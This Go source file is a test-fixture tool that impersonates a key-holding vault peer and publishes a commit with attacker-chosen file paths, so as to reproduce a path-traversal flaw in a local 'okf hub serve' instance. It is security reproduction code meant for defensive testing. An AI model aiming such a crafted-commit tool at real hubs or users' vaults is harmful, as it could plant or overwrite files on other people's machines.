// Command hubpath-peer is an isolated-fixture tool for the hub path-traversal
// repro. It plays a vault peer that holds the vault key (a compromised device,
// collaborator, or key-holding hub) and publishes a commit whose tree manifest
// contains arbitrary, attacker-chosen paths. It talks only to the local
// `okf hub serve` started by the fixture script.
//
// Usage: hubpath-peer -hub URL -vault ID -password P -secret-key K path=content ...
//
// Built with `go build -overlay` against the candidate module so it uses the
// same vault/client code (byte-identical in v0.5.0-darrow-compat.2).
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/okf-memory/okf-agent-memory/pkg/sync"
	"github.com/okf-memory/okf-agent-memory/pkg/vault"
)

func main() {
	hub := flag.String("hub", "", "local hub URL")
	vaultID := flag.String("vault", "", "vault id")
	password := flag.String("password", "", "vault password")
	secret := flag.String("secret-key", "", "vault secret key")
	flag.Parse()
	if err := run(*hub, *vaultID, *password, *secret, flag.Args()); err != nil {
		fmt.Fprintln(os.Stderr, "hubpath-peer:", err)
		os.Exit(1)
	}
}

func run(hub, vaultID, password, secret string, specs []string) error {
	ctx := context.Background()
	key, err := vault.DeriveVaultKey(password, secret)
	if err != nil {
		return err
	}
	client := sync.NewClient(hub, "")
	head, err := client.GetHead(ctx, vaultID)
	if err != nil {
		return err
	}

	tree := vault.NewTree()
	for _, spec := range specs {
		path, content, ok := strings.Cut(spec, "=")
		if !ok {
			return fmt.Errorf("bad spec %q (want path=content)", spec)
		}
		blobHash, err := put(ctx, client, vaultID, key, []byte(content))
		if err != nil {
			return err
		}
		tree.Entries[path] = vault.TreeEntry{
			BlobHash:      blobHash,
			Size:          int64(len(content)),
			PlaintextHash: vault.HashPlaintext([]byte(content)),
			ModifiedAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}
	treeBytes, err := tree.Serialize()
	if err != nil {
		return err
	}
	treeHash, err := put(ctx, client, vaultID, key, treeBytes)
	if err != nil {
		return err
	}

	var parent *string
	if head.HeadCommit != "" {
		parent = &head.HeadCommit
	}
	commit := vault.NewCommit(parent, treeHash, vault.CommitAuthor{ClientID: "hubpath-peer", Agent: "fixture"}, "crafted tree")
	commitBytes, err := commit.Serialize()
	if err != nil {
		return err
	}
	commitHash, err := put(ctx, client, vaultID, key, commitBytes)
	if err != nil {
		return err
	}
	resp, err := client.Commit(ctx, vaultID, commitHash, parent)
	if err != nil {
		return err
	}
	fmt.Printf("peer published head %s with %d crafted entries\n", resp.Head, len(specs))
	return nil
}

func put(ctx context.Context, client *sync.Client, vaultID string, key, plain []byte) (string, error) {
	env, err := vault.EncryptPayload(plain, key)
	if err != nil {
		return "", err
	}
	h := vault.HashBlob(env)
	return h, client.PutBlob(ctx, vaultID, h, env)
}
